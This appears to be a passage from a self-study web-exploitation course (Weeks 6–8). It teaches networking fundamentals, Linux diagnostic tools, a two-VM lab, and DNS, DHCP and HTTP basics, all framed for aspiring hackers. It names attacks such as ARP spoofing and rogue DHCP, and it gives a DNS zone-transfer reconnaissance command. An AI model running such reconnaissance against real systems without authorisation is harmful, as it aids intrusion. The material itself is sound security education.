  2. Write a function that accepts an arbitrary number of keyword arguments and prints them as key=value.
  3. Write a closure that maintains a counter (return a function that increments and returns count).
  4. Scope:
  5. Explain the LEGB rule and predict the output of a nested function snippet.
  6. Exceptions:
  7. Write a program that reads a file name from input, catches FileNotFoundError, and prints a friendly message; else prints the file’s line count.
  8. Password Checker:
  9. Run your checker against the password "P@ssw0rd!" and confirm it rates as “Very Strong”.
  10. Modify the checker to include a bonus point if length >= 12.
  11. Web Fetcher:
  12. Fetch https://httpbin.org/status/404 and verify your script catches the HTTP error gracefully.
  13. Fetch https://jsonplaceholder.typicode.com/todos/1 and print its JSON content using .json().
  14. Debugging:
  15. Insert a deliberate exception in a script, then use breakpoint() to drop into pdb and inspect variables.

If all those work, you’ve internalised the core Python robustness and are ready to tackle networking‑heavy weeks with confidence.

docs.title: Part IX – Cheat Sheet for Week 6
docs.text: Concept Python Syntax Function with defaults def f(a, b=10): *args and **kwargs def f(*args, **kwargs): print(args, kwargs) Returning multiple values return x, y (tuple) Lambda lambda x: x+1 global / nonlocal global var; var = new / nonlocal count Exception handling try: ... except E as e: ... else: ... finally: ... Raise exception raise ValueError("msg") Custom exception class MyErr(Exception): pass Assert assert x > 0, "Positive required" Regex search re.search(r'pattern', text) Regex compile p = re.compile(r'\d+') Length check len(s) >= 8 Install requests pip install requests HTTP GET requests.get(url, timeout=5) Check status r.status_code Raise for HTTP errors r.raise_for_status() JSON response r.json() Debugger break breakpoint() or import pdb; pdb.set_trace()

docs.title: Part X – What’s Next?
docs.text:
Week 7 will be a networking deep dive: OSI model layers, TCP/IP, DNS, HTTP headers, using Wireshark and curl to see raw traffic. You’ll also set up two VMs and ping them, building the hands‑on network knowledge necessary to understand attacks like packet sniffing and MITM.

But for now, make sure your password checker is polished and your web fetcher handles every kind of failure. Commit them to your ~/cybernotes/code folder with comments. They’ll be the foundation of your future toolset.

You’re no longer just writing code; you’re writing resilient code. That’s the difference between a hobbyist and a security professional.

docs.title: Week 7: Networking Core Concepts – From Bits to Transport Layer
docs.text: This week you will stop thinking of the internet as magic. You’ll understand exactly what happens on the wire when two computers talk, how data finds its way across the world, and why every hacker must master networking. We’ll cover IP addresses, MAC addresses, subnetting, the OSI model (layers 1–4 in depth), and essential command‑line tools. Then you’ll build a two‑VM lab, make them talk, and finally trace the entire journey of a URL from your keyboard to a remote server—all the way up to the TCP handshake.

docs.title: Part I – What Is a Network and Why Does It Matter for Web Exploitation?
1.1 A Network in Plain Language
docs.text:
A network is two or more devices connected together so they can exchange data. The devices can be computers, servers, smartphones, or even smart fridges. The connections can be copper wires, fibre‑optic cables, or radio waves (Wi‑Fi). The largest network is the Internet, which is literally a “network of networks”.

In web exploitation, the network is the medium through which your attacks travel. Understanding how data is packaged, addressed, and routed allows you to: - Sniff traffic and extract passwords. - Spoof IP addresses or redirect traffic. - Craft custom packets to bypass firewalls. - Exploit protocols like ARP, DNS, TCP, and TLS.

docs.title: 1.2 Key Terminology
docs.text:
• Host: any device on a network (your laptop, a server, a router).
  • Client: a host that requests services.
  • Server: a host that provides services.
  • LAN (Local Area Network): a network confined to a small geographic area (your home, an office).
  • WAN (Wide Area Network): connects LANs across larger distances; the Internet is a global WAN.
  • NIC (Network Interface Card): the hardware (or virtual) component that connects a device to the network. Every NIC has a unique MAC address.
  • Packet: a small unit of data sent over a network. We’ll see that data is encapsulated in multiple layers.
  • Protocol: a set of rules governing communication (e.g., HTTP, TCP, IP, Ethernet).

docs.title: Part II – IP Addresses: The Logical Identifiers
2.1 IPv4 Address Basics
docs.text:
An IPv4 address is a 32‑bit number, usually written as four decimal numbers (octets) separated by dots, e.g., 192.168.1.10. Each octet represents 8 bits (0–255).

In binary, 192.168.1.10 is:

11000000.10101000.00000001.00001010

docs.title: 2.2 Network and Host Portions
docs.text: An IP address is split into two parts: the network portion (identifies the network) and the host portion (identifies the specific device on that network). The dividing line is defined by the subnet mask.

docs.title: Subnet Mask
docs.text:
• A subnet mask is also a 32‑bit number that “masks” the network part.
  • In binary, it has a contiguous block of 1s followed by 0s.
  • Example: 255.255.255.0 → 11111111.11111111.11111111.00000000 means the first 24 bits are the network, last 8 bits are the host.

docs.title: CIDR Notation
docs.text:
• CIDR (Classless Inter‑Domain Routing) writes the IP followed by a slash and the number of network bits: 192.168.1.0/24.
  • /24 is equivalent to mask 255.255.255.0.
  • Common masks: /8 (255.0.0.0), /16 (255.255.0.0), /24 (255.255.255.0).

docs.title: Network Address and Broadcast Address
docs.text:
• The network address is the first address in the block: host bits all 0. Example: 192.168.1.0 (cannot be assigned to a device).
  • The broadcast address is the last address: host bits all 1. Example: 192.168.1.255. Packets sent to this address reach all hosts on that network.
  • Everything between can be assigned to hosts (192.168.1.1 to 192.168.1.254 for /24).

docs.title: 2.3 Public and Private IP Addresses
docs.text:
Because the global supply of IPv4 addresses is limited, certain ranges are reserved for private internal networks (RFC 1918): - 10.0.0.0/8 (10.x.x.x) - 172.16.0.0/12 (172.16.0.0 – 172.31.255.255) - 192.168.0.0/16 (192.168.x.x)

These addresses can be used by anyone on their own LAN, but they are not routable on the public internet. NAT (Network Address Translation) allows multiple devices with private addresses to share a single public IP (assigned to your home router). As a hacker, you’ll often find internal targets on private subnets after gaining an initial foothold.

docs.title: 2.4 Default Gateway
docs.text: A host on a LAN usually has a default gateway, which is the router’s IP address on that LAN. When a host needs to send a packet to a destination outside its own network, it sends it to the default gateway, which then routes it further.

docs.title: 2.5 Loopback Address
docs.text: The block 127.0.0.0/8 is reserved for the loopback interface. 127.0.0.1 is the standard loopback address, meaning “this host itself”. Any packet sent to 127.0.0.1 never leaves the machine; it’s used for testing and local services.

docs.title: Part III – MAC Addresses: The Physical Identifiers
3.1 What is a MAC Address?
docs.text:
A Media Access Control (MAC) address is a 48‑bit (6‑byte) identifier burned into every network interface at manufacturing time. It’s usually written as six pairs of hexadecimal digits separated by colons or hyphens, e.g., 00:1A:2B:3C:4D:5E.

  • The first 3 bytes identify the manufacturer (OUI – Organizationally Unique Identifier).
  • The last 3 bytes are a unique device ID assigned by the manufacturer.

docs.title: 3.2 Role in a LAN
docs.text: MAC addresses operate at Layer 2 (Data Link). Within the same local network, devices communicate using MAC addresses, not IP addresses. When Host A wants to send a packet to Host B’s IP, it must first discover B’s MAC address using ARP (Address Resolution Protocol).

docs.title: 3.3 Why Both MAC and IP?
docs.text:
• IP addresses are logical, hierarchical, and can change based on network configuration. They enable routing across different networks.
  • MAC addresses are flat, physical, and unique (in theory). They only matter within the same broadcast domain (LAN). A router strips the MAC addresses when forwarding a packet to another network and replaces them with its own.

docs.title: Part IV – The OSI Model: Layers 1–4 Exposed
docs.text: The OSI (Open Systems Interconnection) model is a conceptual framework that divides network communication into seven layers. We’ll master the bottom four, because that’s where most network attacks happen. The TCP/IP model, which is what the internet actually uses, roughly combines the top three OSI layers into one “Application” layer, but we’ll stick with OSI for learning.

docs.title: 4.1 Layer 1 – Physical Layer
docs.text:
What it does: Transmits raw bits (0s and 1s) over a physical medium. - Media: copper cables (Ethernet), fibre optic, radio waves (Wi‑Fi). - Devices: hubs (repeaters, just forward bits to all ports), cables, connectors, network interface cards (physical part). - Data unit: bit. - Protocols: Ethernet physical standards (1000BASE‑T, etc.), Wi‑Fi (802.11 physical layer).

Security relevance: Physical layer attacks include wiretapping, jamming, or simply plugging into an open switch port. In CTFs, you’re usually above this layer unless you’re doing hardware hacking.

docs.title: 4.2 Layer 2 – Data Link Layer
docs.text: What it does: Provides node‑to‑node data transfer between two directly connected devices. It defines how data is formatted for transmission and how access to the physical medium is controlled. It also handles error detection (but not correction) on the physical link. - Data unit: frame. - Addressing: MAC addresses. A frame contains source MAC and destination MAC. - Devices: switches (intelligent hubs that forward frames based on MAC address tables), bridges. - Key protocol: Ethernet (for wired LANs), ARP (Address Resolution Protocol), Wi‑Fi (802.11 MAC layer).

docs.title: 4.2.1 Ethernet Frame Structure (Simplified)
docs.text: | Destination MAC (6 bytes) | Source MAC (6 bytes) | EtherType (2 bytes) | Payload (46–1500 bytes) | FCS (4 bytes) | - EtherType indicates which upper‑layer protocol is inside (e.g., 0x0800 for IPv4).

docs.title: 4.2.2 ARP (Address Resolution Protocol)
docs.text:
ARP resolves an IP address to a MAC address. Suppose host A (192.168.1.10, MAC aa:aa:aa:aa:aa:aa) wants to send to host B (192.168.1.20). A sends an ARP request as a broadcast frame (destination MAC ff:ff:ff:ff:ff:ff) asking: “Who has 192.168.1.20? Tell 192.168.1.10.” All devices on the LAN receive it, but only B replies with an ARP reply (unicast) containing its MAC address. A then caches this mapping in its ARP table.

Security: ARP spoofing is a classic man‑in‑the‑middle attack where an attacker sends fake ARP replies to associate their MAC with the gateway’s IP, allowing traffic interception.

docs.title: 4.2.3 Switch Operation
docs.text: A switch learns which MAC addresses are reachable via which port by inspecting source MACs of incoming frames. It forwards frames only to the port where the destination MAC is known, unlike a hub which repeats everything. This improves security but can be defeated by MAC flooding or ARP spoofing.

docs.title: 4.3 Layer 3 – Network Layer
docs.text: What it does: Handles logical addressing and routing—moving packets from a source host to a destination host across multiple networks (internetworking). It does not guarantee delivery. - Data unit: packet (or datagram). - Addressing: IP addresses. - Devices: routers (connect different networks), Layer 3 switches. - Key protocols: IPv4, IPv6, ICMP, ARP (sometimes considered layer 2.5, but heavily tied to IP), OSPF, BGP (routing protocols).

docs.title: 4.3.1 IPv4 Packet Header (Key Fields)
docs.text:
• Source IP (32 bits)
  • Destination IP (32 bits)
  • TTL (Time‑To‑Live): decremented by each router; packet discarded when 0 to avoid infinite loops.
  • Protocol: identifies the upper‑layer protocol (TCP=6, UDP=17, ICMP=1).
  • Header Checksum: error detection for header.

docs.title: 4.3.2 Routing Basics
docs.text: When a host wants to send a packet to an IP not on its local subnet, it sends the packet to its default gateway (a router). Routers use routing tables to decide where to forward the packet next. Routing can be static (manually configured) or dynamic (learned via OSPF, BGP). The traceroute command exploits the TTL field to discover the path.

docs.title: 4.3.3 ICMP (Internet Control Message Protocol)
docs.text: Used for diagnostic and error messages. Examples: - ping uses ICMP Echo Request and Echo Reply (type 8 and 0). - traceroute uses ICMP Time Exceeded (type 11) to map hops. - Destination Unreachable (type 3) when a network/host/port is unreachable.

docs.title: 4.4 Layer 4 – Transport Layer
docs.text: What it does: Ensures end‑to‑end communication between applications. Provides reliable (TCP) or unreliable (UDP) data delivery, error recovery, flow control, and multiplexing using ports. - Data unit: segment (TCP) or datagram (UDP). - Addressing: port numbers (16‑bit integers, 0–65535). Source port (ephemeral, randomly chosen) and destination port (well‑known for services: 80 HTTP, 443 HTTPS, 22 SSH, etc.). - Protocols: TCP, UDP.

docs.title: 4.4.1 TCP (Transmission Control Protocol)
docs.text:
• Connection‑oriented: a connection is established before data transfer (the famous TCP 3‑way handshake).
  • Reliable: ensures all data arrives in order and without errors using sequence numbers, acknowledgements, and retransmissions.
  • Flow control and congestion control (sliding window).
  • Full‑duplex.

TCP 3‑Way Handshake: 1. Client → Server: SYN (synchronise) – Client picks an initial sequence number (ISN) x. Flag: SYN=1. 2. Server → Client: SYN‑ACK – Server picks its ISN y, acknowledges x+1. Flags: SYN=1, ACK=1. 3. Client → Server: ACK – Client acknowledges y+1. Flags: ACK=1.

Connection is now ESTABLISHED. Now data can be transferred.

TCP Header Key Fields: - Source Port, Destination Port (16 bits each) - Sequence Number (32 bits) - Acknowledgment Number (32 bits) - Flags: SYN, ACK, FIN, RST, PSH, URG. - Window Size (16 bits): flow control.

Connection Termination: FIN and FIN‑ACK flags, or RST (reset) to abort.

docs.title: 4.4.2 UDP (User Datagram Protocol)
docs.text:
• Connectionless, no handshake.
  • Unreliable: no guarantee of delivery, ordering, or duplicate protection.
  • Lightweight, low overhead.
  • Used by DNS (port 53), DHCP, streaming.
  • UDP header only has source port, destination port, length, checksum.

Security relevance: - TCP attacks: SYN flooding (resource exhaustion), session hijacking, RST injection. - UDP: DNS spoofing, amplification DDoS. - Port scanning: tools like nmap probe these layers to identify open services.

docs.title: 4.4.3 Port Multiplexing
docs.text: IP address identifies the host, but port number identifies the specific application or service on that host. The combination (IP + port) is a socket. Multiple applications can run simultaneously on a server; ports separate them. For example, a web server might listen on TCP port 80 and SSH on TCP port 22. When a client connects, the OS uses the destination port to deliver the segment to the correct server process. Ephemeral source ports (e.g., 49152+) are used for the client side to allow multiple concurrent connections to the same server.

docs.title: Part V – Command Line Tools: Real‑World Inspection
docs.text: Now we’ll use our Ubuntu VM to see networking in action. Open a terminal.

docs.title: 5.1 ip command (modern) and ifconfig (legacy)
docs.text:
Display network interfaces and their configuration:

ip addr show

Or shorthand: ip a. Output includes: - lo: loopback interface, IP 127.0.0.1/8. - enp0s3 or eth0: your main Ethernet interface. Look for inet 192.168.x.x/24 and a MAC address link/ether .... - MAC address displayed after link/ether.

Example output snippet:

2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP ...
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.11/24 brd 192.168.1.255 scope global dynamic enp0s3

You can also see the broadcast address (brd) and the network mask. dynamic means IP obtained via DHCP.

docs.title: 5.2 ping – Test connectivity with ICMP
docs.text:
ping 8.8.8.8

This sends ICMP Echo Requests to Google’s DNS server. You’ll see replies with TTL and round‑trip time. Press Ctrl+C to stop and see statistics.

Ping your own gateway (usually 192.168.1.1 or whatever ip route shows as default):

ping -c 4 192.168.1.1

-c 4 sends exactly 4 pings.

Firewall note: Many servers block ICMP, so lack of ping reply doesn’t mean the host is down.

docs.title: 5.3 traceroute – Map the network path
docs.text:
Linux traceroute uses UDP by default, but you can use ICMP with -I:

traceroute 8.8.8.8    # may need sudo
sudo traceroute -I 8.8.8.8

It sends packets with increasing TTL. Each router along the path sends back an ICMP Time Exceeded when TTL hits 0, revealing its IP. Some routers may not respond (shown as *). This is a reconnaissance tool to see network topology.

docs.title: 5.4 netstat and ss – See active connections and listening ports
docs.text:
netstat is older but still available; ss is its modern replacement.

ss -tuln
  • -t : TCP
  • -u : UDP
  • -l : listening sockets
  • -n : numeric (no DNS resolution)

You’ll see all services running on your machine and which ports they listen on. For example:

State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN  0       128     0.0.0.0:22          0.0.0.0:*

That means SSH server is listening on port 22 on all interfaces. 127.0.0.1:631 might be CUPS (printing service) listening only locally.

docs.title: 5.5 arp – View ARP cache
docs.text:
arp -a

Shows IP‑to‑MAC mappings your host has learned. You’ll see entries like:

_gateway (192.168.1.1) at 00:11:22:33:44:55 [ether] on enp0s3

If you’re in a VM, the gateway is often the host’s virtual router IP.

docs.title: 5.6 ip route – Check routing table
docs.text:
ip route

Shows the default gateway and any specific routes. Example:

default via 192.168.1.1 dev enp0s3 proto dhcp src 192.168.1.11 metric 100
192.168.1.0/24 dev enp0s3 proto kernel scope link src 192.168.1.11

Line 1: default route – all traffic not for local network goes to 192.168.1.1. Line 2: for the local /24 subnet, send directly on the interface without a router.

docs.title: Part VI – Lab: Set Up Two VMs and Make Them Ping
docs.text: We’ll build a tiny isolated LAN between two virtual machines. This lets you experiment without affecting your host network.

docs.title: 6.1 VirtualBox Networking Modes Overview
docs.text:
• NAT: VM shares host’s IP, can access internet but host cannot easily initiate connection to VM. Each VM in NAT mode is in its own isolated network; they cannot communicate with each other.
  • Bridged: VM appears as separate device on the host’s physical LAN, gets its own IP from the router. VMs can see each other and the host.
  • Host‑Only: VMs can talk to each other and the host, but not the outside internet (unless you set up routing). Perfect for isolated labs.
  • Internal Network: VMs can talk only to each other, not even the host. Even more isolated.

We’ll use Host‑Only for simplicity and to allow the host to also interact.

docs.title: Step 1: Create a Host‑Only Network in VirtualBox
docs.text:
• Open VirtualBox main window.
  • Go to File → Preferences → Network (or Tools → Network Manager on newer versions).
  • Click Host‑Only Networks tab.
  • Click the + (add) icon to create a new host‑only network. Default is vboxnet0. Ensure DHCP server is enabled (default) or disabled if you want to configure static IPs manually. For simplicity, enable DHCP.

docs.title: Step 2: Clone Your Existing Ubuntu VM (or create a second lightweight VM)
docs.text:
• Right‑click your first VM and choose Clone.
  • Name it WebExploitLab2.
  • MAC Address Policy: ensure it’s set to Generate new MAC addresses for all network adapters (this is crucial to avoid conflicts).
  • Choose Full clone (creates an independent copy).
  • Wait for the cloning process.

docs.title: Step 3: Configure Both VMs to Use Host‑Only Network
docs.text:
• For each VM (WebExploitLab and WebExploitLab2), go to Settings → Network.
  • Adapter 1 should already be NAT (leave it, to keep internet access for downloads). Enable a second adapter (Adapter 2):
  • Check Enable Network Adapter.
  • Attached to: Host‑only Adapter.
  • Name: select vboxnet0 (or the one you created).
  • Start both VMs.

docs.title: Step 4: Verify IP Configuration Inside VMs
docs.text:
In each VM’s terminal, run:

ip a

Look for a second interface, likely enp0s8 or similar, with an IP in the 192.168.56.0/24 range (default for vboxnet0). For example, VM1 gets 192.168.56.101, VM2 gets 192.168.56.102.

If you don’t see an IP, the DHCP service might not be running. Start it via VirtualBox Network Manager, or set a static IP manually (recommended practice):

# Example on VM1 (temporary)
sudo ip addr add 192.168.56.10/24 dev enp0s8
sudo ip link set enp0s8 up

On VM2 set 192.168.56.20/24.

docs.title: Step 5: Ping Each Other
docs.text:
From VM1:

ping 192.168.56.20   # VM2's host-only IP

From VM2:

ping 192.168.56.10

You should see successful replies. You now have a secure lab network.

docs.title: Step 6: Explore ARP
docs.text: On VM1, run arp -a after pinging; you’ll see VM2’s MAC address.

docs.title: Step 7: Optional – Capture Packets with Wireshark
docs.text: Install Wireshark on the host, select the vboxnet0 interface, and start capturing. Then ping between VMs. You’ll see ARP requests, ARP replies, and ICMP Echo packets. This visualises everything you’ve learned.

docs.title: Part VII – Milestone: Explain What Happens When You Type a URL (Up to TCP/IP)
docs.text: This is the classic interview question, and by now you have all the pieces. Let’s trace the journey from the moment you type http://example.com and hit Enter, up to the point where a TCP connection is established. We’ll stay within the scope of the first four OSI layers plus DNS and HTTP (application layer entry necessary to get the IP).

docs.title: 7.1 Step 1 – Application Layer: URL Parsing and DNS
docs.text:
• Browser extracts the hostname example.com and the protocol (HTTP, port 80).
  • It needs the IP address of example.com.
  • DNS query is initiated (application layer protocol, but uses UDP port 53 at transport).
  • The DNS query is encapsulated in a UDP segment (dest port 53, source port ephemeral), placed in an IP packet destined to the configured DNS server (e.g., 8.8.8.8), then framed for Ethernet.

docs.title: 7.2 Step 2 – Network Layer: Determining the Route
docs.text:
• My host’s IP stack checks if the DNS server IP is on the same subnet as my own IP. Using the subnet mask, it determines it’s not (e.g., my IP is 192.168.1.10/24, DNS is 8.8.8.8 → different network).
  • The packet must be sent to the default gateway (router) 192.168.1.1.

docs.title: 7.3 Step 3 – Data Link Layer: ARP to Reach the Gateway
docs.text:
• My host looks in its ARP cache for the MAC address of 192.168.1.1. If not present:
  • It sends an ARP request broadcast frame: “Who has 192.168.1.1? Tell 192.168.1.10”.
  • The gateway responds with an ARP reply containing its MAC address.
  • My host now has the MAC of the gateway.

docs.title: 7.4 Step 4 – Framing and Physical Transmission
docs.text:
• The DNS query (UDP segment inside IP packet) is placed inside an Ethernet frame:
  • Destination MAC: the gateway’s MAC.
  • Source MAC: my host’s MAC.
  • EtherType: 0x0800 (IPv4).
  • The frame is transmitted as electrical/optical signals over the physical medium (Layer 1) to the switch/router.

docs.title: 7.5 Step 5 – Routing the DNS Packet Across the Internet
docs.text:
• The gateway router receives the frame, extracts the IP packet, inspects destination IP (8.8.8.8).
  • It consults its routing table and forwards the packet to the next‑hop router, re‑encapsulating with new Layer 2 frames appropriate for each link (new source/dest MACs).
  • This continues hop‑by‑hop, each router decrementing TTL, until the packet reaches the DNS server.

docs.title: 7.6 Step 6 – DNS Resolution Response
docs.text: • DNS server replies with the IP address of example.com, say 93.184.216.34. The response travels back through the same process. My host extracts the IP.

docs.title: 7.7 Step 7 – Now the TCP Handshake to the Web Server
docs.text:
• My host now knows the web server’s IP and wants to establish a TCP connection on port 80.
  • Since the server is not on the local network, the first packet (SYN) is again destined to the default gateway.
  • ARP for gateway (if not cached), same as before.
  • The TCP 3‑way handshake commences:
  • SYN from my host to 93.184.216.34:80. Source port: ephemeral (e.g., 50321). Sequence number: x. This packet crosses the internet, routed just like the DNS query.
  • The server receives SYN, notices port 80 is open, and replies SYN‑ACK: source port 80, dest port 50321, sequence y, acknowledgement x+1.
  • My host receives SYN‑ACK, sends ACK with sequence x+1 and acknowledgement y+1.

Now the TCP connection is established. The client can now send the HTTP GET request (application layer) over this connection, but that’s beyond our “up to TCP/IP” scope. The critical networking foundation—IP addressing, MAC addresses, ARP, routing, TCP handshake—has been used.

docs.title: Part VIII – Week 7 Verification and Practice
8.1 Commands You Must Master
docs.text:
• Show interfaces and IP: ip addr show or ip a.
  • Ping local and remote hosts: ping -c 4 8.8.8.8.
  • Trace route: traceroute -I <host> (may need sudo).
  • Show routing table: ip route.
  • Show ARP cache: arp -a or ip neigh.
  • Show listening ports: ss -tuln.

docs.title: 8.2 Milestone Questions
docs.text:
1. What is the difference between a MAC address and an IP address? When is each used?
  2. If two hosts are on the same /24 network, do they need a router to communicate? Why or why not?
  3. Describe the ARP process when Host A (192.168.1.5) wants to ping Host B (192.168.1.20) for the first time.
  4. What is the default gateway, and why is it necessary?
  5. Walk through the TCP 3‑way handshake, including flags and sequence numbers.
  6. Using your two‑VM lab, start a tcpdump capture on one VM and then ping the other. Explain every packet you see.

docs.title: 8.3 Extra Practice (Highly Recommended)
docs.text:
• Install Wireshark on the host and capture on the host‑only network while pinging between VMs. Identify every frame, ARP, IP, ICMP. This visual reinforcement is invaluable.
  • Use ss -tuln to see the SSH server listening on port 22, then explain how a remote SSH connection would go through the layers.

docs.title: Part IX – Cheat Sheet for Week 7
docs.text: Concept Key Points IPv4 address 32 bits, dotted decimal, private ranges: 10.x, 172.16-31, 192.168.x Subnet mask Defines network portion, CIDR /24 = 255.255.255.0 MAC address 48 bits, hex, used within LAN, unique per NIC OSI Layer 1 Physical – bits, cables, hubs Layer 2 Data Link – frames, MAC, switches, ARP Layer 3 Network – packets, IP, routers, ICMP Layer 4 Transport – segments (TCP) or datagrams (UDP), ports, reliability TCP handshake SYN, SYN‑ACK, ACK; establishes connection ARP Resolves IP → MAC; broadcast request, unicast reply ip a Display IP and MAC ping Test connectivity via ICMP Echo traceroute Map network path ss -tuln Show listening TCP/UDP ports arp -a Display ARP cache ip route Show routing table, default gateway Host‑only network VirtualBox mode for isolated VM‑to‑VM communication

docs.title: Part X – Resources
docs.text:
• Professor Messer Network+, watch the videos corresponding to the OSI model, subnetting, and TCP/IP. His explanations are crisp and exam‑focused.
  • For a deeper dive, read the first chapters of “Computer Networking: A Top‑Down Approach” or watch the free Cisco Networking Academy “Introduction to Networks” as time permits.

With Week 7 behind you, you now see the internet not as a cloud but as a structured stack of protocols. Every web exploit you’ll ever craft will exploit a weakness at one of these layers. Next week, we’ll climb the stack into application protocols (HTTP, DNS, DHCP) and learn to manipulate them with curl, Wireshark, and Burp Suite. But first, fully internalise these fundamentals—they’re etched into the bones of every good hacker.

docs.title: Week 8: Application‑Layer Protocols – HTTP, DNS, DHCP, and Real‑World Traffic Analysis
docs.text: This week you leave the transport plumbing behind and ascend to the layer where human‑readable protocols live. You’ll learn how the web’s core protocol—HTTP—actually works, how domain names are resolved into IP addresses via DNS, how your machine automatically gets an IP address via DHCP, and how to use command‑line tools (curl, dig, Wireshark) to see raw protocol interactions. You’ll then apply this knowledge immediately by solving Natas levels 0 and 1, and finally you’ll craft a raw HTTP request by hand—a skill every hacker must possess.

docs.title: Part I – Transport Layer Review: TCP vs. UDP from the Application’s Perspective
docs.text:
You already know the difference between TCP and UDP from Week 7, but now we look at why an application developer or an attacker chooses one over the other.

Feature TCP UDP Connection Connection‑oriented (handshake) Connectionless Reliability Guaranteed delivery, ordering, retransmission No guarantees, packets may be lost or reordered Overhead Higher (20‑byte header, acknowledgements, flow control) Lower (8‑byte header) Speed Slower due to overhead Faster, higher throughput possible Use cases HTTP/HTTPS, SSH, FTP, SMTP, anything needing reliable data DNS, DHCP, streaming, VoIP, online gaming, IoT sensors Attack surface SYN floods, session hijacking, RST injection DNS cache poisoning, amplification DDoS, UDP flood

From the application’s point of view, TCP provides a reliable byte stream—the application just writes and reads data. UDP sends independent datagrams (messages) that may or may not arrive. Protocols like DNS generally use UDP because queries are short and must be fast; if a response is lost, the client just retransmits after a timeout. HTTP uses TCP because a web page must be transferred complete and in order.

Port concept: Both TCP and UDP use 16‑bit port numbers to deliver data to the correct process on a host. Ports 0‑1023 are well‑known (privileged), 1024‑49151 are registered, 49152‑65535 are ephemeral (client‑side). A few important ones:

Port Protocol Transport 20, 21 FTP TCP 22 SSH TCP 23 Telnet TCP 25 SMTP TCP 53 DNS UDP (also TCP for zone transfers) 67,68 DHCP UDP 80 HTTP TCP 110 POP3 TCP 143 IMAP TCP 443 HTTPS TCP 3306 MySQL TCP 5432 PostgreSQL TCP 8080 HTTP alternate TCP

When you later scan a target, you’ll look for these ports. When you craft an exploit, you’ll need to know if the service speaks TCP or UDP.

docs.title: Part II – DNS: The Phonebook of the Internet
docs.text: Every time you type a URL, your machine must first resolve the hostname to an IP address. DNS (Domain Name System) is a hierarchical, distributed database that performs this mapping.

docs.title: 2.1 Domain Hierarchy
docs.text:
. (root)
├── .com
│   └── example
│       └── www (hostname)
├── .org
└── .net

A fully qualified domain name (FQDN) like www.example.com. includes the trailing dot (root). The resolution process starts at the root and works downwards.

docs.title: 2.2 DNS Query Types
docs.text:
• A: maps a hostname to an IPv4 address.
  • AAAA: maps hostname to IPv6 address.
  • CNAME: alias (canonical name), e.g., www.example.com → example.com.
  • MX: mail exchanger for a domain.
  • NS: name server for a domain.
  • SOA: Start of Authority, administrative info.
  • TXT: arbitrary text, often used for SPF, DKIM, domain verification.
  • PTR: reverse lookup (IP → hostname). Requires special domain in-addr.arpa.

docs.title: 2.3 Recursive and Iterative Resolution
docs.text:
When your laptop asks the configured DNS resolver (usually your ISP’s or 8.8.8.8) to resolve example.com, the resolver may recursively query on your behalf: 1. Your stub resolver (OS) sends a recursive query to the recursive resolver. 2. The recursive resolver asks a root server for .com NS. 3. Then asks .com server for example.com NS. 4. Then asks example.com’s authoritative server for www.example.com. 5. Returns the final answer to you.

This whole process typically happens over UDP port 53, and if the answer is too large, it may fall back to TCP.

docs.title: 2.4 Resolver Configuration
docs.text:
On Linux, the resolver configuration is in /etc/resolv.conf:

nameserver 8.8.8.8
nameserver 1.1.1.1

The file may be overwritten by systemd-resolved; you can use resolvectl to check actual servers.

docs.title: dig (Domain Information Groper)
docs.text:
The definitive DNS debugging tool.

# Basic A record query
dig example.com

# Short answer
dig example.com +short

# Query specific record type
dig example.com MX
dig example.com NS
dig example.com TXT

# Query a specific name server
dig @8.8.8.8 example.com

# Reverse lookup
dig -x 8.8.8.8

# Trace the delegation path from root
dig +trace example.com

# Show only answer section
dig example.com A +noall +answer

The output includes: - Header: flags (qr, rd, ra), status (NOERROR, NXDOMAIN, etc.) - Question section - Answer section (the actual records) - Authority and Additional sections

Security note: If DNS is not secured with DNSSEC, an attacker can spoof responses (DNS cache poisoning). In CTFs, you might find domain‑based challenges; dig is your first tool.

docs.title: nslookup (legacy but still used)
docs.text:
nslookup example.com
nslookup -type=MX example.com

docs.title: 2.6 DNS in Web Exploitation
docs.text:
• Subdomain enumeration: brute‑forcing subdomains (e.g., admin.example.com, dev.example.com) often reveals hidden services.
  • DNS zone transfer: misconfigured servers allow AXFR request to dump all records. Try: dig axfr example.com @ns1.example.com.
  • DNS rebinding: a tricky attack that bypasses same‑origin policy.

docs.title: Part III – DHCP: Getting an IP Address Automatically
docs.text: DHCP (Dynamic Host Configuration Protocol) is how your device gets an IP address, subnet mask, default gateway, and DNS servers when connecting to a network. It uses UDP ports 67 (server) and 68 (client).

docs.title: 3.1 DHCP Four‑Way Handshake (DORA)
docs.text:
1. Discover: Client broadcasts “I need an IP!” (destination 255.255.255.255:67, source 0.0.0.0:68).
  2. Offer: Any DHCP server responds with an offered IP and configuration.
  3. Request: Client broadcasts which offer it’s accepting (can be multiple offers).
  4. Acknowledge (ACK): Server confirms the lease.

The lease has a duration; clients renew at half‑life.

docs.title: 3.2 Relevance for Hackers
docs.text:
• Rogue DHCP server: set up a fake DHCP server that assigns malicious DNS or gateway, leading to MITM (Man‑in‑the‑Middle) attacks.
  • DHCP starvation: exhaust available IPs to cause denial of service.
  • In CTFs, you might need to reconfigure network settings or investigate DHCP logs.

To see DHCP on your VM, you can use tcpdump during a sudo dhclient -r && sudo dhclient (release and renew). But that’s extra; we’ll focus on DNS and HTTP for now.

docs.title: Part IV – HTTP: The Protocol That Runs the Web
docs.text: HTTP (Hypertext Transfer Protocol) is a request‑response protocol over TCP (usually port 80). It’s stateless: each request is independent. We’ll cover HTTP/1.1 in depth because that’s what you’ll encounter most in CTFs and real‑world web apps.

docs.title: 4.1 HTTP Request Structure
docs.text:
A client sends a request like:

GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
Accept: text/html,application/xhtml+xml,...
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

Parts: 1. Request line: METHOD /path HTTP/version 2. Headers (0 or more): Name: Value pairs, carriage‑return + line‑feed (\r\n) after each. 3. Empty line (\r\n) marking end of headers. 4. Body (optional, e.g., for POST data).

docs.title: 4.2 HTTP Methods
docs.text:
• GET: retrieve a resource. Should be idempotent and safe (no side effects).
  • HEAD: like GET, but returns only headers (no body). Useful for testing.
  • POST: submit data to the server, often creates a new resource. Not idempotent.
  • PUT: replace or create a resource at a specific URI.
  • DELETE: remove a resource.
  • OPTIONS: ask which methods are allowed on a resource.
  • PATCH: partial modification.
